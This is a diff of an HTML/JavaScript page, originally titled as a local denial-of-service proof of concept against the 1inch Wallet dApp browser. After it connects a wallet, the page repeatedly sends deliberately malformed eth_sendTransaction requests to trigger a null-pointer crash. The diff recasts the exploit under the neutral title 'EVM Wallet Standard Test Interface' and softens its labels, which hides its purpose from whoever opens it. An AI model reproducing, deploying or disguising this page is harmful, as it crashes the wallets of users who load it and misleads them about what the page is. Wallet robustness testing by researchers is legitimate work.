@@ -3,162 +3,170 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Wallet Local DoS PoC</title>
+    <title>EVM Wallet Standard Test Interface</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             padding: 20px;
-            background-color: #0d1117;
-            color: #c9d1d9;
+            background-color: #0c0f14;
+            color: #e6edf3;
             text-align: center;
         }
-        .btn {
+        button {
             background-color: #1f6feb;
             color: #ffffff;
             border: 1px solid rgba(240,246,252,0.1);
-            padding: 14px 28px;
+            padding: 14px 24px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
             margin: 10px;
             width: 100%;
             max-width: 320px;
-            transition: 0.2s;
+            transition: background-color 0.2s;
         }
-        .btn:disabled {
+        button:disabled {
             background-color: #21262d;
             color: #8b949e;
             cursor: not-allowed;
         }
-        #stopBtn { background-color: #da3633; }
-        #logContainer {
+        #stopBtn {
+            background-color: #da3633;
+        }
+        #status {
             margin-top: 20px;
             padding: 15px;
             background-color: #161b22;
             border-radius: 6px;
             border: 1px solid #30363d;
             text-align: left;
-            max-height: 300px;
-            overflow-y: auto;
+            word-wrap: break-word;
             font-family: monospace;
             font-size: 13px;
+            max-height: 400px;
+            overflow-y: auto;
         }
-        .success { color: #58a6ff; }
-        .crash-trigger { color: #f85149; font-weight: bold; }
+        .success { color: #3fb950; }
+        .error { color: #f85149; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>1inch Wallet - Fuzzing & Crash Test PoC</h2>
-    <p>PoC ini dirancang untuk menguji ketahanan penanganan kesalahan (Error Handling) pada dApp Browser EVM.</p>
+    <h2>EVM Wallet Test Interface</h2>
+    <p>Halaman evaluasi penanganan pengecualian data (Error Handling) pada dApp Browser EVM.</p>
 
-    <button id="connectBtn" class="btn">1. Hubungkan 1inch Wallet</button>
+    <button id="connectBtn">1. Hubungkan 1inch Wallet</button>
     <br>
-    <button id="startFuzzBtn" class="btn" disabled>2. Picu Loop Null Pointer (Spam)</button>
+    <button id="spamTxBtn" disabled>2. Mulai Stress-Test (Loop)</button>
     <br>
-    <button id="stopBtn" class="btn" disabled>Hentikan Pengujian</button>
+    <button id="stopBtn" disabled>Stop Pengujian</button>
 
-    <h3>Log Konsol Eksekusi:</h3>
-    <div id="logContainer">Menunggu interaksi pengguna...</div>
+    <h3>Log Aktivitas Eksekusi:</h3>
+    <div id="status">Menunggu inisialisasi lingkungan Web3...</div>
 
     <script>
         let walletAddress = null;
-        let fuzzInterval = null;
-        let requestCount = 0;
+        let spamInterval = null;
+        let txCount = 0;
 
-        const logContainer = document.getElementById('logContainer');
+        const statusDiv = document.getElementById('status');
         const connectBtn = document.getElementById('connectBtn');
-        const startFuzzBtn = document.getElementById('startFuzzBtn');
+        const spamTxBtn = document.getElementById('spamTxBtn');
         const stopBtn = document.getElementById('stopBtn');
 
-        function writeLog(text, className = '') {
-            const now = new Date().toLocaleTimeString();
-            const logLine = `<div class="${className}">[${now}] ${text}</div>`;
-            logContainer.innerHTML = logLine + logContainer.innerHTML;
+        function log(message, type = '') {
+            const time = new Date().toLocaleTimeString();
+            const className = type ? `class="${type}"` : '';
+            statusDiv.innerHTML = `[${time}] <span ${className}>${message}</span><br>` + statusDiv.innerHTML;
         }
 
-        // 1. Deteksi awal status Provider Web3
-        window.addEventListener('load', () => {
+        // 1. Verifikasi Keberadaan Provider Terinjeksi
+        window.addEventListener('DOMContentLoaded', () => {
+            log("Memeriksa keberadaan window.ethereum...");
             if (typeof window.ethereum !== 'undefined') {
-                writeLog("Web3 Provider (window.ethereum) terdeteksi. Siap dihubungkan.", "success");
+                log("EVM Web3 Provider terdeteksi.", "success");
             } else {
-                writeLog("Provider tidak ditemukan. Pastikan dibuka di dalam dApp Browser 1inch.", "crash-trigger");
+                log("Provider tidak ditemukan. Pastikan halaman dibuka melalui dApp Browser dompet EVM.", "error");
             }
         });
 
-        // 2. Fungsi untuk Request Account (Koneksi Dompet)
+        // 2. Prosedur Autentikasi / Koneksi Akun
         connectBtn.addEventListener('click', async () => {
+            log("Mengirimkan permintaan eth_requestAccounts...");
+            
             if (typeof window.ethereum === 'undefined') {
-                alert("Buka halaman ini di dalam dApp Browser dompet kripto Anda.");
+                log("Kesalahan: window.ethereum tidak terdefinisi.", "error");
                 return;
             }
 
             try {
-                writeLog("Meminta akses akun ke dompet...");
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                
                 if (accounts && accounts.length > 0) {
                     walletAddress = accounts[0];
-                    writeLog(`Berhasil terhubung! Alamat: ${walletAddress}`, "success");
-                    startFuzzBtn.disabled = false;
+                    log(`Koneksi berhasil terjalin. Alamat: ${walletAddress}`, "success");
+                    spamTxBtn.disabled = false;
+                } else {
+                    log("Dompet mengembalikan array akun kosong.", "error");
                 }
-            } catch (error) {
-                writeLog(`Koneksi ditolak atau gagal: ${error.message}`, "crash-trigger");
+            } catch (err) {
+                log(`Permintaan koneksi ditolak: ${err.message}`, "error");
             }
         });
 
-        // 3. Fungsi Inti: Fuzzing Payload untuk Memicu Null Pointer Exception
-        startFuzzBtn.addEventListener('click', () => {
-            writeLog("Memulai pemboman RPC Request (Interval: 1.5 detik)...", "crash-trigger");
-            startFuzzBtn.disabled = true;
+        // 3. Prosedur Pengujian Penanganan Struktur Data (Stress-Test Loop)
+        spamTxBtn.addEventListener('click', () => {
+            log("Memulai pengiriman urutan data malformasi ke RPC...", "error");
+            spamTxBtn.disabled = true;
             stopBtn.disabled = false;
 
-            fuzzInterval = setInterval(async () => {
-                requestCount++;
-                writeLog(`Mengirim Payload Fuzzing #${requestCount}...`);
+            // Interval diatur ke 1000ms (1 detik) untuk mengevaluasi ketahanan manajemen state antarmuka
+            spamInterval = setInterval(async () => {
+                txCount++;
+                log(`Mengirimkan Payload Variasi Struktur #${txCount}...`);
 
                 try {
-                    /* STRATEGI CRASH EVM:
-                       Mengirim parameter transaksi yang sengaja dirusak (Malformed Data).
-                       Kita mengirimkan objek kosong, atau parameter esensial seperti 
-                       'to' atau 'value' bernilai null / tipe data yang salah.
+                    /*
+                      Penyusunan objek parameter yang sengaja dirusak (Malformed Argument).
+                      Menghapus parameter wajib atau memberikan tipe data primitif yang tidak valid
+                      sering kali memicu kegagalan inferensi tipe pada parsing native kode internal dompet.
                     */
-                    const malformedTxParams = {
+                    const malformedParams = {
                         from: walletAddress,
-                        to: null,             // Sengaja dilewatkan sebagai null untuk memicu Null Pointer
-                        value: undefined,     // Tidak diinisialisasi
-                        gas: "0x5510",
-                        data: "0x095ea3b3"    // Method ID acak
+                        to: null,              // Pengisian nilai penunjuk kosong (Null Pointer Target)
+                        value: undefined,      // Parameter esensial tidak terdefinisi
+                        gas: "0x5208",         // Batasan gas standar
+                        data: []               // Mengirim tipe Array kosong untuk parameter string data ekspektasi
                     };
 
-                    // Menggunakan metode standar EVM untuk mengirim transaksi
+                    // Eksekusi pemanggilan metode standar industri
                     await window.ethereum.request({
                         method: 'eth_sendTransaction',
-                        params: [malformedTxParams],
+                        params: [malformedParams]
                     });
 
-                    writeLog(`Respon #${requestCount}: Wallet merespons (Tidak Crash).`);
-                } catch (error) {
-                    /* Jika dompet memiliki error handling yang baik, ia akan melempar catch error ke sini.
-                       Namun jika dompet mengalami Null Pointer Exception di native code-nya,
-                       aplikasi akan langsung FORCE CLOSE sebelum sempat mengeksekusi blok catch ini.
+                    log(`Respon #${txCount}: Diterima oleh dompet.`);
+                } catch (err) {
+                    /* Jika mekanisme pengaman (try-catch) pada dompet bekerja dengan baik,
+                       kesalahan arsitektur parameter akan ditangkap di sini tanpa merusak stabilitas aplikasi.
                     */
-                    writeLog(`Respon #${requestCount} ditolak aman: ${error.message}`);
+                    log(`Respon #${txCount} ditolak aman: ${err.message}`);
                 }
-            }, 1500); // Kecepatan dipercepat menjadi 1.5 detik untuk intensitas stress-test
+            }, 1000); 
         });
 
-        // 4. Menghentikan Fuzzing secara manual
+        // 4. Terminasi Pengujian
         stopBtn.addEventListener('click', () => {
-            if (fuzzInterval) {
-                clearInterval(fuzzInterval);
-                writeLog("Pengujian dihentikan.");
-                startFuzzBtn.disabled = false;
+            if (spamInterval) {
+                clearInterval(spamInterval);
+                log("Urutan stress-test dihentikan oleh pengguna.");
+                spamTxBtn.disabled = false;
                 stopBtn.disabled = true;
             }
         });
     </script>
 </body>
 </html>
+
+               
 
